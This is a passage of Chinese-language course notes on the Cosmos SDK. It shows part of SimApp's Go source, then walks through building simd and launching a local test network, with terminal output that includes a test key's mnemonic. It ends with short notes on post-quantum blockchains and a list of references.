func (app *SimApp) BeginBlocker(ctx sdk.Context, req abci.RequestBeginBlock) abci.ResponseBeginBlock {
	return app.ModuleManager.BeginBlock(ctx, req)
}

// EndBlocker application updates every end block
func (app *SimApp) EndBlocker(ctx sdk.Context, req abci.RequestEndBlock) abci.ResponseEndBlock {
	return app.ModuleManager.EndBlock(ctx, req)
}

func (a *SimApp) Configurator() module.Configurator {
	return a.configurator
}

// InitChainer application update at chain initialization
func (app *SimApp) InitChainer(ctx sdk.Context, req abci.RequestInitChain) abci.ResponseInitChain {
	var genesisState GenesisState
	if err := json.Unmarshal(req.AppStateBytes, &genesisState); err != nil {
		panic(err)
	}
	app.UpgradeKeeper.SetModuleVersionMap(ctx, app.ModuleManager.GetVersionMap())
	return app.ModuleManager.InitGenesis(ctx, app.appCodec, genesisState)
}

// LoadHeight loads a particular height
func (app *SimApp) LoadHeight(height int64) error {
	return app.LoadVersion(height)
}

// LegacyAmino returns SimApp's amino codec.
//
// NOTE: This is solely to be used for testing purposes as it may be desirable
// for modules to register their own custom testing types.
func (app *SimApp) LegacyAmino() *codec.LegacyAmino {
	return app.legacyAmino
}

// AppCodec returns SimApp's app codec.
//
// NOTE: This is solely to be used for testing purposes as it may be desirable
// for modules to register their own custom testing types.
func (app *SimApp) AppCodec() codec.Codec {
	return app.appCodec
}

// InterfaceRegistry returns SimApp's InterfaceRegistry
func (app *SimApp) InterfaceRegistry() types.InterfaceRegistry {
	return app.interfaceRegistry
}

// TxConfig returns SimApp's TxConfig
func (app *SimApp) TxConfig() client.TxConfig {
	return app.txConfig
}

// AutoCliOpts returns the autocli options for the app.
func (app *SimApp) AutoCliOpts() autocli.AppOptions {
	modules := make(map[string]appmodule.AppModule, 0)
	for _, m := range app.ModuleManager.Modules {
		if moduleWithName, ok := m.(module.HasName); ok {
			moduleName := moduleWithName.Name()
			if appModule, ok := moduleWithName.(appmodule.AppModule); ok {
				modules[moduleName] = appModule
			}
		}
	}

	return autocli.AppOptions{Modules: modules}
}

// DefaultGenesis returns a default genesis from the registered AppModuleBasic's.
func (a *SimApp) DefaultGenesis() map[string]json.RawMessage {
	return ModuleBasics.DefaultGenesis(a.appCodec)
}

// GetKey returns the KVStoreKey for the provided store key.
//
// NOTE: This is solely to be used for testing purposes.
func (app *SimApp) GetKey(storeKey string) *storetypes.KVStoreKey {
	return app.keys[storeKey]
}

// GetTKey returns the TransientStoreKey for the provided store key.
//
// NOTE: This is solely to be used for testing purposes.
func (app *SimApp) GetTKey(storeKey string) *storetypes.TransientStoreKey {
	return app.tkeys[storeKey]
}

// GetMemKey returns the MemStoreKey for the provided mem key.
//
// NOTE: This is solely used for testing purposes.
func (app *SimApp) GetMemKey(storeKey string) *storetypes.MemoryStoreKey {
	return app.memKeys[storeKey]
}

// GetSubspace returns a param subspace for a given module name.
//
// NOTE: This is solely to be used for testing purposes.
func (app *SimApp) GetSubspace(moduleName string) paramstypes.Subspace {
	subspace, _ := app.ParamsKeeper.GetSubspace(moduleName)
	return subspace
}

// SimulationManager implements the SimulationApp interface
func (app *SimApp) SimulationManager() *module.SimulationManager {
	return app.sm
}

// RegisterAPIRoutes registers all application module routes with the provided
// API server.
func (app *SimApp) RegisterAPIRoutes(apiSvr *api.Server, apiConfig config.APIConfig) {
	clientCtx := apiSvr.ClientCtx
	// Register new tx routes from grpc-gateway.
	authtx.RegisterGRPCGatewayRoutes(clientCtx, apiSvr.GRPCGatewayRouter)

	// Register new tendermint queries routes from grpc-gateway.
	tmservice.RegisterGRPCGatewayRoutes(clientCtx, apiSvr.GRPCGatewayRouter)

	// Register node gRPC service for grpc-gateway.
	nodeservice.RegisterGRPCGatewayRoutes(clientCtx, apiSvr.GRPCGatewayRouter)

	// Register grpc-gateway routes for all modules.
	ModuleBasics.RegisterGRPCGatewayRoutes(clientCtx, apiSvr.GRPCGatewayRouter)

	// register swagger API from root so that other applications can override easily
	if err := server.RegisterSwaggerAPI(apiSvr.ClientCtx, apiSvr.Router, apiConfig.Swagger); err != nil {
		panic(err)
	}
}

// RegisterTxService implements the Application.RegisterTxService method.
func (app *SimApp) RegisterTxService(clientCtx client.Context) {
	authtx.RegisterTxService(app.BaseApp.GRPCQueryRouter(), clientCtx, app.BaseApp.Simulate, app.interfaceRegistry)
}

// RegisterTendermintService implements the Application.RegisterTendermintService method.
func (app *SimApp) RegisterTendermintService(clientCtx client.Context) {
	tmservice.RegisterTendermintService(
		clientCtx,
		app.BaseApp.GRPCQueryRouter(),
		app.interfaceRegistry,
		app.Query,
	)
}

func (app *SimApp) RegisterNodeService(clientCtx client.Context) {
	nodeservice.RegisterNodeService(clientCtx, app.GRPCQueryRouter())
}

// GetMaccPerms returns a copy of the module account permissions
//
// NOTE: This is solely to be used for testing purposes.
func GetMaccPerms() map[string][]string {
	dupMaccPerms := make(map[string][]string)
	for k, v := range maccPerms {
		dupMaccPerms[k] = v
	}

	return dupMaccPerms
}

// BlockedAddresses returns all the app's blocked account addresses.
func BlockedAddresses() map[string]bool {
	modAccAddrs := make(map[string]bool)
	for acc := range GetMaccPerms() {
		modAccAddrs[authtypes.NewModuleAddress(acc).String()] = true
	}

	// allow the following addresses to receive funds
	delete(modAccAddrs, authtypes.NewModuleAddress(govtypes.ModuleName).String())

	return modAccAddrs
}

// initParamsKeeper init params keeper and its subspaces
func initParamsKeeper(appCodec codec.BinaryCodec, legacyAmino *codec.LegacyAmino, key, tkey storetypes.StoreKey) paramskeeper.Keeper {
	paramsKeeper := paramskeeper.NewKeeper(appCodec, legacyAmino, key, tkey)

	paramsKeeper.Subspace(authtypes.ModuleName)
	paramsKeeper.Subspace(banktypes.ModuleName)
	paramsKeeper.Subspace(stakingtypes.ModuleName)
	paramsKeeper.Subspace(minttypes.ModuleName)
	paramsKeeper.Subspace(distrtypes.ModuleName)
	paramsKeeper.Subspace(slashingtypes.ModuleName)
	paramsKeeper.Subspace(govtypes.ModuleName).WithKeyTable(govv1.ParamKeyTable())
	paramsKeeper.Subspace(crisistypes.ModuleName)

	return paramsKeeper
}

func makeEncodingConfig() simappparams.EncodingConfig {
	encodingConfig := simappparams.MakeTestEncodingConfig()
	std.RegisterLegacyAminoCodec(encodingConfig.Amino)
	std.RegisterInterfaces(encodingConfig.InterfaceRegistry)
	ModuleBasics.RegisterLegacyAminoCodec(encodingConfig.Amino)
	ModuleBasics.RegisterInterfaces(encodingConfig.InterfaceRegistry)
	return encodingConfig
}

```

`SimApp`是使用 Cosmos SDK生成的用于测试和学习的应用程序，可以通过SimApp的创链过程，了解Cosmos SDK的基础构造和运行过程。

下面介绍如何运行基于SimApp的simd测试网:

- 从 Cosmos SDK 存储库的根目录中，运行`make build`。这将在新目录`build`中构建二进制文件。后续指令需要在`build`目录内运行。

```shell
linux@linux:~/Cosmos/cosmos-sdk-main$ make build
fatal: 不是 git 仓库（或者任何父目录）：.git
fatal: 不是 git 仓库（或者任何父目录）：.git
mkdir -p /home/linux/Cosmos/cosmos-sdk-main/build/
cd /home/linux/Cosmos/cosmos-sdk-main/simapp && go build -mod=readonly -tags "netgo ledger" -ldflags '-X github.com/cosmos/cosmos-sdk/version.Name=sim -X github.com/cosmos/cosmos-sdk/version.AppName=simd -X github.com/cosmos/cosmos-sdk/version.Version= -X github.com/cosmos/cosmos-sdk/version.Commit= -X "github.com/cosmos/cosmos-sdk/version.BuildTags=netgo,ledger" -X github.com/tendermint/tendermint/version.TMCoreSemVer=v0.37.0-rc2 -w -s' -trimpath -o /home/linux/Cosmos/cosmos-sdk-main/build/ ./...
go: downloading cosmossdk.io/math v1.0.0-beta.4
go: downloading github.com/cosmos/cosmos-db v0.0.0-20221226095112-f3c38ecb5e32
go: downloading cosmossdk.io/tools/rosetta v0.2.0
go: downloading github.com/tendermint/tendermint v0.37.0-rc2
go: downloading github.com/spf13/cobra v1.6.1
go: downloading github.com/spf13/viper v1.14.0
go: downloading github.com/cosmos/gogoproto v1.4.3
go: downloading github.com/golang/protobuf v1.5.2
go: downloading github.com/grpc-ecosystem/grpc-gateway v1.16.0
go: downloading google.golang.org/grpc v1.51.0
go: downloading google.golang.org/protobuf v1.28.1
go: downloading cosmossdk.io/api v0.2.6
go: downloading cosmossdk.io/client/v2 v2.0.0-20230104083136-11f46a0bae58
go: downloading cosmossdk.io/core v0.4.0
go: downloading cosmossdk.io/depinject v1.0.0-alpha.3
go: downloading github.com/stretchr/testify v1.8.1
go: downloading github.com/tendermint/go-amino v0.16.0
go: downloading sigs.k8s.io/yaml v1.3.0
go: downloading github.com/pkg/errors v0.9.1
go: downloading github.com/cosmos/go-bip39 v1.0.0
go: downloading github.com/btcsuite/btcd/btcec/v2 v2.3.2
go: downloading github.com/cosmos/keyring v1.2.0
go: downloading github.com/tendermint/crypto v0.0.0-20191022145703-50d29ede1e15
go: downloading cosmossdk.io/errors v1.0.0-beta.7
go: downloading github.com/gorilla/mux v1.8.0
go: downloading github.com/rakyll/statik v0.1.7
go: downloading github.com/spf13/cast v1.5.0
go: downloading golang.org/x/exp v0.0.0-20221019170559-20944726eadf
go: downloading github.com/cosmos/cosmos-proto v1.0.0-beta.1
go: downloading github.com/hashicorp/golang-lru v0.5.5-0.20210104140557-80c98217689d
go: downloading google.golang.org/genproto v0.0.0-20221227171554-f9683d7f8bef
go: downloading github.com/fsnotify/fsnotify v1.6.0
go: downloading github.com/mitchellh/mapstructure v1.5.0
go: downloading github.com/spf13/afero v1.9.2
go: downloading github.com/spf13/jwalterweatherman v1.1.0
go: downloading github.com/google/btree v1.1.2
go: downloading github.com/syndtr/goleveldb v1.0.1-0.20210819022825-2ae1ddf74ef7
go: downloading github.com/grpc-ecosystem/go-grpc-middleware v1.3.0
go: downloading golang.org/x/crypto v0.5.0
go: downloading github.com/cosmos/gogogateway v1.2.0
go: downloading github.com/gorilla/handlers v1.5.1
go: downloading github.com/confio/ics23/go v0.9.0
go: downloading github.com/golang/mock v1.6.0
go: downloading github.com/armon/go-metrics v0.4.1
go: downloading github.com/go-kit/log v0.2.1
go: downloading github.com/go-logfmt/logfmt v0.5.1
go: downloading golang.org/x/net v0.5.0
go: downloading github.com/cosmos/iavl v0.20.0-alpha1
go: downloading github.com/go-kit/kit v0.12.0
go: downloading github.com/prometheus/client_golang v1.14.0
go: downloading github.com/hdevalence/ed25519consensus v0.0.0-20220222234857-c00d1f31bab3
go: downloading github.com/bgentry/speakeasy v0.1.0
go: downloading github.com/mattn/go-isatty v0.0.17
go: downloading github.com/cosmos/ledger-cosmos-go v0.12.2
go: downloading github.com/tendermint/btcd v0.1.1
go: downloading github.com/cosmos/btcutil v1.0.5
go: downloading github.com/prometheus/common v0.39.0
go: downloading github.com/davecgh/go-spew v1.1.1
go: downloading github.com/pmezard/go-difflib v1.0.0
go: downloading gopkg.in/yaml.v3 v3.0.1
go: downloading github.com/improbable-eng/grpc-web v0.15.0
go: downloading github.com/lib/pq v1.10.7
go: downloading github.com/rs/cors v1.8.2
go: downloading github.com/tendermint/tm-db v0.6.7
go: downloading pgregory.net/rapid v0.5.3
```

- 执行`$ ./simd init [moniker] --chain-id [chain-id]`.这将初始化一个新的隐藏工作目录`~/.simapp`在默认位置 。需要提供[moniker]和[chain-id]。两个名称可以是任何名称，但在后续步骤中，需要使用相同值。

```shell
linux@linux:~/Cosmos/cosmos-sdk-main/build$  ./simd init monkey --chain-id 3307
{"app_message":{"auth":{"accounts":[],"params":{"max_memo_characters":"256","sig_verify_cost_ed25519":"590","sig_verify_cost_secp256k1":"1000","tx_sig_limit":"7","tx_size_cost_per_byte":"10"}},"authz":{"authorization":[]},"bank":{"balances":[],"denom_metadata":[],"params":{"default_send_enabled":true,"send_enabled":[]},"send_enabled":[],"supply":[]},"capability":{"index":"1","owners":[]},"consensus":null,"crisis":{"constant_fee":{"amount":"1000","denom":"stake"}},"distribution":{"delegator_starting_infos":[],"delegator_withdraw_infos":[],"fee_pool":{"community_pool":[]},"outstanding_rewards":[],"params":{"base_proposer_reward":"0.000000000000000000","bonus_proposer_reward":"0.000000000000000000","community_tax":"0.020000000000000000","withdraw_addr_enabled":true},"previous_proposer":"","validator_accumulated_commissions":[],"validator_current_rewards":[],"validator_historical_rewards":[],"validator_slash_events":[]},"evidence":{"evidence":[]},"feegrant":{"allowances":[]},"genutil":{"gen_txs":[]},"gov":{"deposit_params":null,"deposits":[],"params":{"max_deposit_period":"172800s","min_deposit":[{"amount":"10000000","denom":"stake"}],"min_initial_deposit_ratio":"0.000000000000000000","quorum":"0.334000000000000000","threshold":"0.500000000000000000","veto_threshold":"0.334000000000000000","voting_period":"172800s"},"proposals":[],"starting_proposal_id":"1","tally_params":null,"votes":[],"voting_params":null},"group":{"group_members":[],"group_policies":[],"group_policy_seq":"0","group_seq":"0","groups":[],"proposal_seq":"0","proposals":[],"votes":[]},"mint":{"minter":{"annual_provisions":"0.000000000000000000","inflation":"0.130000000000000000"},"params":{"blocks_per_year":"6311520","goal_bonded":"0.670000000000000000","inflation_max":"0.200000000000000000","inflation_min":"0.070000000000000000","inflation_rate_change":"0.130000000000000000","mint_denom":"stake"}},"nft":{"classes":[],"entries":[]},"params":null,"slashing":{"missed_blocks":[],"params":{"downtime_jail_duration":"600s","min_signed_per_window":"0.500000000000000000","signed_blocks_window":"100","slash_fraction_double_sign":"0.050000000000000000","slash_fraction_downtime":"0.010000000000000000"},"signing_infos":[]},"staking":{"delegations":[],"exported":false,"last_total_power":"0","last_validator_powers":[],"params":{"bond_denom":"stake","historical_entries":10000,"max_entries":7,"max_validators":100,"min_commission_rate":"0.000000000000000000","unbonding_time":"1814400s"},"redelegations":[],"unbonding_delegations":[],"validators":[]},"upgrade":{},"vesting":{}},"chain_id":"3307","gentxs_dir":"","moniker":"monkey","node_id":"a618eb59133c6a89252e4e7d0f6f2f5c724bcc58"}
linux@linux:~/Cosmos/cosmos-sdk-main/build$ 
```

- `$ ./simd keys add [key_name]`.这将创建一个新密钥，其中包含可随意选择的名称[key_name]。执行命令后，终端输出的内容需要保存一下，信息非常重要。

```shell
linux@linux:~/Cosmos/cosmos-sdk-main/build$ ./simd keys add keyname

- address: cosmos1v9x8reez5zkt7h5kcykzgtssdead0mv6jl7k8f
  name: keyname
  pubkey: '{"@type":"/cosmos.crypto.secp256k1.PubKey","key":"Ahg+4lFkHp3ylHGbDl0ghDCLLHblmSdhLAUSp8iCL6+9"}'
  type: local


**Important** write this mnemonic phrase in a safe place.
It is the only way to recover your account if you ever forget your password.

minor gown melody joy wait mother bright eternal wealth odor orchard habit pluck name image badge ticket aerobic option cross approve foster liberty truck
linux@linux:~/Cosmos/cosmos-sdk-main/build$ 
```

![image](https://user-images.githubusercontent.com/87604354/211182035-a72f3c9f-bea0-4036-8ef4-164105c7053e.png)

- `$ ./simd genesis add-genesis-account [key_name] [amount]`，这里的[key_name]与之前保持一致，而[amount]可以填写类似于`10000000000000000000000000stake`的值。

```shell
linux@linux:~/Cosmos/cosmos-sdk-main/build$ ./simd genesis add-genesis-account  keyname 10000000000000000000000000stake
linux@linux:~/Cosmos/cosmos-sdk-main/build$ 
```

注：这里在官方文档中存在错误，官方文档中给出的命令为：

![image](https://user-images.githubusercontent.com/87604354/211182038-6942bd76-164a-41c0-8a1d-b52800130380.png)

- $ `./simd genesis gentx [key_name] [amount] --chain-id [chain-id]`，为新链创造初始交易，这里的[amount]不可过多或过少，至少为`1000000000stake`，否则启动节点时会报错。

```shell
linux@linux:~/Cosmos/cosmos-sdk-main/build$ ./simd genesis gentx keyname 10000000000stake --chain-id 3307
Genesis transaction written to "/home/linux/.simapp/config/gentx/gentx-a618eb59133c6a89252e4e7d0f6f2f5c724bcc58.json"
linux@linux:~/Cosmos/cosmos-sdk-main/build$ 
```

- $ `./simd collect-gentxs`生成包含初始交易的json文件，若有多人参与，则可以包含多个json文件。

![image](https://user-images.githubusercontent.com/87604354/211182042-555712f8-96f2-40d2-ab68-a9841952e6ac.png)

` ./simd start`启动节点。

```shell
linux@linux:~/Cosmos/cosmos-sdk-main/build$ ./simd start
```

![image](https://user-images.githubusercontent.com/87604354/211182048-afac7b97-a021-4731-9fe8-592da423eb3f.png)

![image](https://user-images.githubusercontent.com/87604354/211182052-8cd12514-988d-45f8-adb5-166533d5d674.png)

![image](https://user-images.githubusercontent.com/87604354/211182056-75152569-4ddb-4a43-863e-8734beef54c6.png)

![image](https://user-images.githubusercontent.com/87604354/211182057-58cc9c9a-39f2-4e29-82b1-80108735ec17.png)

![image](https://user-images.githubusercontent.com/87604354/211182059-c1f9e1ae-8a24-4150-a3c4-92608024b10a.png)

现在一个小型测试网构建成功，可以用来尝试对Cosmos SDK或Tendermint的修改。

## 初露锋芒但未来可期的区块链编程技术

课上总结

### 量子区块链与后量子区块链

#### 量子威胁

量子计算      经典密码学    区块链

#### 后量子密码

#### 后量子区块链

### 区块链与元宇宙

独立的数字身份     价值体系     跨宇宙

![image](https://user-images.githubusercontent.com/87604354/211182062-740d5f8c-6ed6-48b2-8fcf-41d1180a89e4.png)

## 参考文献

[Solidity 中编写内联汇编(assembly)的那些事[译\] | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/675)

[FISCO BCOS 技术文档 — FISCO BCOS v2.9.0 文档 (fisco-bcos-documentation.readthedocs.io)](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/)

[WeBASE 技术文档 — WeBASE v1.5.4 文档 (webasedoc.readthedocs.io)](https://webasedoc.readthedocs.io/zh_CN/latest/)

[solidity - What are some examples of how inline assembly benefits smart contract development? - Ethereum Stack Exchange](https://ethereum.stackexchange.com/questions/3157/what-are-some-examples-of-how-inline-assembly-benefits-smart-contract-developmen)

[Yul — Solidity 0.6.2 文档 (soliditylang.org)](https://docs.soliditylang.org/en/v0.6.2/yul.html#restrictions-on-the-grammar)

[深入Solidity数据存储位置 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/4864)

[solidity | 签名 | ecrecover函数有什么用途? - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/547703840)

[Beosin Smart Contract Security Audit Service | Code Review and Report](https://beosin.com/)

[基于VS-Code插件的智能合约自动形式化验证工具Beosin-Vaas离线免费版 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/2019/11/05/Beosin-Vaas)

[(80条消息) 不一样的智能合约安全视角——solidity逆向_知道创宇区块链安全实验室的博客-CSDN博客](https://blog.csdn.net/SierraW/article/details/120161900)

[FISCO-BCOS/SCStudio: Making Smart Contract Development More Secure and Easier (github.com)](https://github.com/FISCO-BCOS/SCStudio)

Meng Ren, Fuchen Ma, Zijing Yin, Ying Fu, Huizhong Li, Wanli Chang, and Yu Jiang. 2021. Making smart contract development more secure and easier. In Proceedings of the 29th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering (ESEC/FSE 2021). Association for Computing Machinery, New York, NY, USA, 1360–1370. https://doi.org/10.1145/3468264.3473929

[压力测试指南 — FISCO BCOS v2.9.0 文档 (fisco-bcos-documentation.readthedocs.io)](https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html)

[一文读懂跨链智能合约 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/3632)

[一文读懂跨链智能合约 - Chainlink Blog](https://blog.chain.link/cross-chain-smart-contracts-zh/)

BitXHub 白皮书 v2.0 [Microsoft Word - BitXHub V2.0 白皮书.docx (hyperchain.cn)](https://upload.hyperchain.cn/BitXHub白皮书.pdf)

[深入理解EVM操作码，让你写出更好的智能合约 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/5137)

https://docs.cosmos.network/

https://mp.weixin.qq.com/s/4EBw-hS_cS4H5wJMT-9Cnw

[COSMOS (github.com)](https://github.com/cosmos)

https://mp.weixin.qq.com/s/WGFRcf_0BZxbek6eNnkeNA

[Cosmos: The Internet of Blockchains](https://cosmos.network/)

[智能合约安全审计入门篇 —— Phishing with tx.origin | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/5105)

[Cosmos-SDK/Simapp at v0.47.0-alpha1 ·Cosmos/Cosmos-SDK (github.com)](https://github.com/cosmos/cosmos-sdk/tree/v0.47.0-alpha1/simapp)

[重磅发布 | FISCO BCOS v3.0核心特性与技术实现](https://www.fisco.org.cn/news_7/401.html)

[智能合约审计-拒绝服务漏洞及案例分析 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/5270)

[智能合约安全审计入门篇 —— 随机数 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/4399)

[智能合约安全审计入门篇 —— 移花接木 | 登链社区 | 区块链技术社区 (learnblockchain.cn)](https://learnblockchain.cn/article/5259)

https://mp.weixin.qq.com/s/MEjJhroRKYi7WsvviDYhtQ



















